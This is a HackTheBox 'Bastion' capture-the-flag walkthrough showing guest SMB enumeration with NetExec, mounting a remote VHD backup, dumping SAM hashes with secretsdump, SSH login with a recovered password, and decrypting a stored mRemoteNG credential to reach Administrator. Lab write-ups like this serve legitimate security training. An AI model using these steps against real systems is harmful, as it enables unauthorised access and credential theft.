Add the target machine IP to `/etc/hosts` to bind it to a domain name. This makes it easier to reference the target without memorizing the IP address.

```bash
nano /etc/hosts
```

![[HackTheBox/Bastion/images/1.png]]

Check whether the target is accessible via the `ping` command. Sending only 4 ICMP requests is sufficient; otherwise, it will loop indefinitely.

```bash
ping -c 4 bastion.htb
```

![[HackTheBox/Bastion/images/2.png]]

Conduct port scan:

```bash
sudo nmap -sV -sC --max-rate 10000 bastion.htb
```

Results were fascinating!

SMB guest mode is enabled and the OS version is clearly identified (two OS details are revealed).

![[HackTheBox/Bastion/images/3.png]]

Let me use `NetExec` to enumerate `SMB` shares.

I tried empty credentials, which triggered a `Guest Logon` scan:

```bash
nxc smb 10.129.136.29 -u '' -p '' --shares
```

It returned an error:

![[HackTheBox/Bastion/images/4.png]]

Default usage:

```bash
nxc smb 10.129.136.29
```

![[HackTheBox/Bastion/images/5.png]]

Since the `guest` account is enabled, I'll attempt to enumerate using `guest` as the username.

![[HackTheBox/Bastion/images/6.png]]

Append `--shares` to retrieve share information.

![[HackTheBox/Bastion/images/7.png]]

As shown above, I have `READ` and `WRITE` permissions on certain shares. I will focus on the `Backups` share first.

Additionally, you can use the `--shares READ,WRITE` parameter to filter only shares where you have `READ` and `WRITE` access.

![[HackTheBox/Bastion/images/8.png]]

The `NetExec` documentation explains how to authenticate once a user:pass combination is found:

[SMB AUTH](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain)

In my case, `Bastion\guest` works as expected:

```bash
SMB         10.129.136.29   445    BASTION          [+] Bastion\guest:
```

I now have the DOMAIN:USER:PASS format (with an empty password).

Using the `--users` flag, we can enumerate domain users:

`nxc smb 10.129.136.29 -u 'guest' -p '' --users`

![[HackTheBox/Bastion/images/9.png]]

I used the `spider_plus` module to recursively list all files on the share and identified a `note.txt` file.

```bash
nxc smb 10.129.136.29 -u 'guest' -p '' -M spider_plus
```

![[HackTheBox/Bastion/images/11.png]]


![[HackTheBox/Bastion/images/10.png]]


Using the `--spider` option, you can list files filtered by their extensions.

```bash
nxc smb 10.129.136.29 -u 'guest' -p '' --spider Backups --pattern txt
```

![[HackTheBox/Bastion/images/12.png]]

Let's download `note.txt` to `/tmp/` directory:

```bash
nxc smb 10.129.136.29 -u 'guest' -p '' --share Backups --get-file note.txt /tmp/note.txt
```

![[HackTheBox/Bastion/images/13.png]]

The note warns against downloading the entire backup file as it slows down the VPN:

![[HackTheBox/Bastion/images/14.png]]

The total size is `5.05 GB`, so let's check if there is an alternative method to access the files on the `Backups` share without downloading them entirely.

![[HackTheBox/Bastion/images/15.png]]

I noticed the file listed in the `spider_plus` module log:

![[HackTheBox/Bastion/images/16.png]]

I found a valuable resource about `.vhd` (Virtual Hard Disk) files:

[VHD](https://www.techtarget.com/searchvirtualdesktop/definition/virtual-hard-disk-VHD)

A Reddit user provides a helpful insight:

[Reddit Discussion](https://www.reddit.com/r/Windows11/comments/120wluy/is_a_vm_required_to_downloadinstall_vhds/)

`FYI, you don't need to install a VM or use 7-Zip or any other archiving tool to work with VHDs. Windows can mount them natively and they will look like another physical disk on your PC. Right click on the virtual disk file to do this.`

This article demonstrates the technique for mounting a remote VHD file:

[Mounting VHD file](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)

First, mount the SMB share locally:

```bash
mkdir /mnt/remote
```

```bash
mount -t cifs //10.129.136.29/Backups /mnt/remote -o rw
```

The mount failed without credentials, so I found a helpful Ubuntu thread about CIFS mounting:

[CIFS Mount Usage](https://askubuntu.com/questions/101029/how-do-i-mount-a-cifs-share)

```bash
mount -t cifs -o username='guest',password='' //10.129.136.29/Backups /mnt/remote -o rw
```

Now it works!

![[HackTheBox/Bastion/images/17.png]]

I can see the disk image file on the `bastion_smb` share:

![[HackTheBox/Bastion/images/18.png]]

Let's use the command recommended in the Medium article:

```bash
guestmount --add /mnt/remote/path/to/vhdfile.vhd --inspector --ro /mnt/vhd -v
```

I identified the relevant disk file inside the `L4mpje-PC` backup directory:

![[HackTheBox/Bastion/images/19.png]]

```bash
guestmount --add /mnt/bastion_smb/WindowsImageBackup/L4mpje-PC/'Backup 2019-02-22 124351'/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
```

We don't have direct OS access — instead, we have an OS backup. The next logical step is to dump the credentials from the backup's SAM database.

I found a valuable article about extracting credentials from SAM:

[secretsdump](https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary)

To run the tool:

```bash
$ secretsdump.py -sam sam -security security -system system local
```

The required registry hive paths are documented here:

[SAM, SYSTEM & SECURITY Paths](https://github.com/v4resk/red-book/blob/main/redteam/credentials/os-credentials/windows-and-active-directory/sam-and-lsa-secrets.md)

The files are located at:

```bash
\system32\config\sam
\system32\config\security
\system32\config\system
```

Let's extract them:

![[HackTheBox/Bastion/images/20.png]]

```bash

cp SAM SYSTEM SECURITY /home/kali

python secrets.py -sam SAM -security SECURITY -system SYSTEM local
```

![[HackTheBox/Bastion/images/21.png]]

I also ran `impacket-secretsdump` directly, as I encountered an error during the initial SAM hash extraction.

![[HackTheBox/Bastion/images/22.png]]

With the dumped credentials in hand, I'll try authenticating via `SSH`.

It works:

`ssh L4mpje@bastion.htb`

pass: `bureaulampje`

Get flag from `C:\Users\L4mpje\Desktop\`

![[HackTheBox/Bastion/images/23.png]]

I could not find any obvious privilege escalation vector. Before running `winPEAS`, I decided to check for non-default installed programs.

![[HackTheBox/Bastion/images/24.png]]

`mRemoteNG` is a remote connection manager application:

[mremoteng](https://mremoteng.org/)

According to the setup guide, its configuration file is stored at:

https://yurisk.info/2025/02/16/mremoteng-initial-set-up-and-usage/

`C:\Users\<User>\AppData\Roaming\mRemoteNG\confCons.xml`

![[HackTheBox/Bastion/images/25.png]]


The configuration file contains what appears to be an encrypted password:

![[HackTheBox/Bastion/images/26.png]]

The password is indeed encrypted. I found a decryption tool on GitHub:

[mRemoteNG Password Decrypt](https://github.com/gquere/mRemoteNG_password_decrypt)

Let's copy the configuration file to our machine:

`scp L4mpje@10.129.136.29:"C:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml" .`

![[27.png]]

Now authenticate as Administrator and retrieve the root flag:

```bash
ssh Administrator@10.129.136.29
```

![[28.png]]

